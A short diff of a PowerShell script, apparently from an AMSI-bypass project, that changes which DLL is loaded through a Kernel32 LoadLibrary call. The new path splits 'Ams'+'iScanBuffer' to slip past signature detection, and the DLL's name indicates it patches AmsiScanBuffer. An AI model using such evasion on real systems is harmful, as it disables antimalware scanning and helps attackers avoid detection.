@@ -9,4 +9,5 @@ public static class Kernel32 {
 }
 '@
 
-$AmsiHandle = [Kernel32]::LoadLibrary("C:\Users\rikoteki\Desktop\Repository\AMSIByPassDll\target\debug\AMSIBypassDLL.dll")
+$AmsiHandle = [Kernel32]::LoadLibrary("C:\Users\rikoteki\Desktop\Repository\AMSIBypassDLL\Patching_Ams"+"iScanBuffer\target\debug\Patching_0000ScanBuffer.dll")
+Write-Host $AmsiHandle
